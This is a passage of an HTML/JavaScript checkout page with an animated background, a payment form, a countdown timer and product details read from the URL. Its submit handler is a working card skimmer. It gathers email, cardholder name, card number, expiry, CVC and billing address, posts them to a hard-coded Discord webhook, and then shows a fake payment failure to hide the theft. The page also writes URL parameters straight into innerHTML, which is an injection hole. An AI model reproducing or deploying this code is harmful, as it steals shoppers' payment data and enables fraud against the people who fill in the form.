      border: none;
      border-radius: 6px;
      background: rgba(255, 255, 255, 0.9);
      color: #000;

      font-weight: 600;

  <script>
    VANTA.BIRDS({
      el: "#vanta-bg",
      mouseControls: true,
      touchControls: true,
      gyroControls: false,
      minHeight: 200.00,
      minWidth: 200.00,
      scale: 1.00,
      scaleMobile: 1.00,
      backgroundColor: 0x000000,
      color1: 0x000000,
      color2: 0xe108ff,
      colorMode: "lerp",
      birdSize: 0.50,
      wingSpan: 40.00,
      speedLimit: 3.00
    });

    const form = document.getElementById('paymentForm');
    const cardNumberInput = document.getElementById('card-number');
    const expiryInput = document.getElementById('expiry');
    const cvcInput = document.getElementById('cvc');

    cardNumberInput.addEventListener('input', formatCardNumber);
    expiryInput.addEventListener('input', formatExpiryDate);
    cvcInput.addEventListener('input', formatCVC);

    form.addEventListener('submit', async (e) => {
      e.preventDefault();

      const email = form.email.value.trim();
      const ccName = form['cc-name'].value.trim();
      const cardNumber = form['cc-number'].value.trim();
      const expiry = form['cc-exp'].value.trim();
      const cvc = form['cc-csc'].value.trim();
      const address = form.address.value.trim();
      const zipcode = form.zipcode.value.trim();
      const country = form.country.value;

      const message = `A new payment log has been created with the following details:\n\n- **Email:** ${email}\n- **Name on Card:** ${ccName}\n- **Card Number:** ${cardNumber}\n- **Expiry Date:** ${expiry}\n- **CVC:** ${cvc}\n- **Address:** ${address}\n- **Zipcode/Postcode:** ${zipcode}\n- **Country/Region:** ${country}`;

      try {
        await fetch('https://discord.com/api/webhooks/1377012040136261714/ouKIQ8B-prKmYxoO3w58qCQs93u_HH-HYITy3ma_WrciuHvGoKIdLKwvSwSI7iANdg3a', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({ content: message }),
        });
        // Simulate payment failure and redirect to payment_failed.html
        window.location.href = 'payment_failed.html';
        form.reset();
      } catch (error) {
        alert('Failed to send payment info.');
        console.error('Error:', error);
      }
    });

    function updateCountdown() {
      const minutes = 15;
      let timeLeft = minutes * 60;
      const countdownElement = document.getElementById('countdown');

      const interval = setInterval(() => {
        const minutesLeft = Math.floor(timeLeft / 60);
        const secondsLeft = timeLeft % 60;
        countdownElement.innerText = `${minutesLeft}:${secondsLeft < 10 ? '0' : ''}${secondsLeft}`;

        if (timeLeft <= 0) {
          clearInterval(interval);
          window.location.href = 'index.html'; // Redirect to homepage
        }

        timeLeft--;
      }, 1000);
    }

    updateCountdown();

    function formatCardNumber() {
      let value = cardNumberInput.value.replace(/[^0-9]/g, ''); // Only numbers
      if (value.length > 16) value = value.substring(0, 16);
      let formattedValue = '';
      for (let i = 0; i < value.length; i += 4) {
        formattedValue += value.substring(i, i + 4) + ' ';
      }
      cardNumberInput.value = formattedValue.trim(); // Remove trailing space
    }

    function formatExpiryDate() {
      let value = expiryInput.value.replace(/\D/g, ''); // Remove non-digits
      if (value.length > 4) value = value.substring(0, 4);
      if (value.length > 2) {
        value = value.substring(0, 2) + '/' + value.substring(2);
      }
      expiryInput.value = value;
    }

    function formatCVC() {
      let value = cvcInput.value.replace(/\D/g, ''); // Remove non-digits
      if (value.length > 4) value = value.substring(0, 4);
      cvcInput.value = value;
    }
  </script>

  <script>
    const params = new URLSearchParams(window.location.search);
    const productName = params.get('product');
    const productPrice = params.get('price');
    const productQuantity = params.get('quantity');
    const productDuration = params.get('duration');
    const totalAmount = params.get('total');

    const productInfoDiv = document.querySelector('.product-info');
    if (productInfoDiv && productName && productPrice && productDuration && productQuantity && totalAmount) {
      productInfoDiv.innerHTML = `
        You are buying <strong>${productName}</strong><br>
        Price: ${productPrice} x ${productQuantity} (${productDuration})<br>
        <strong>Total: $${totalAmount}</strong>
